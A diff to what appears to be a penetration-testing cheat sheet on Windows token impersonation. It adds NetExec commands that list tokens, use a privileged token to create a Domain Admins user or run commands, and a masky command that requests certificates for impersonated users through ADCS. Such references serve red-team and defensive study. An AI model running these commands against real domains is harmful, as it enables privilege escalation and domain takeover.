@@ -108,3 +108,23 @@ AcquireCredentialsHandle() is used with a session LUID to increase the Reference
 With administrative access to a (or multiple) computer, it is possible to retrieve the different process tokens, impersonate them and request CSRs and PEM certificate for the impersonated users.
 
     .\Masky.exe /ca:<CA_server_FQDN\CA_name> /template:<template_name> /output:./output.txt
+
+# Python
+
+##### List available tokens, and find an interesting token ID
+
+    nxc smb -u user1 -p password -M impersonate -o MODULE=list
+
+##### With only SeImpersonatePrivilege, if a privileged user's token is present on the machine, it is possible to run code on the domain as him and add a new user in the domain (and add him to the Domain Admins by default):
+
+    nxc smb -u user1 -p password -M impersonate -o MODULE=adduser TOKEN=<token_id> CMD="user2 password 'Domain Admins' \\dc.domain.local"
+
+##### With SeImpersonatePrivilege and SeAssignPrimaryToken, if a privileged user's token is present on the machine, it is possible to execute commands on the machine as him:
+
+    nxc smb -u user1 -p password -M impersonate -o MODULE=exec TOKEN=<token_id> CMD=<command>
+
+### Tokens and ADCS
+
+With administrative access to a (or multiple) computer, it is possible to retrieve the different process tokens, impersonate them and request CSRs and PEM certificate for the impersonated users.
+
+    masky -d domain.local -u user1 -p <password> -dc-ip <DC_IP> -ca <CA_server_FQDN\CA_name> -o <result_folder> <targets>
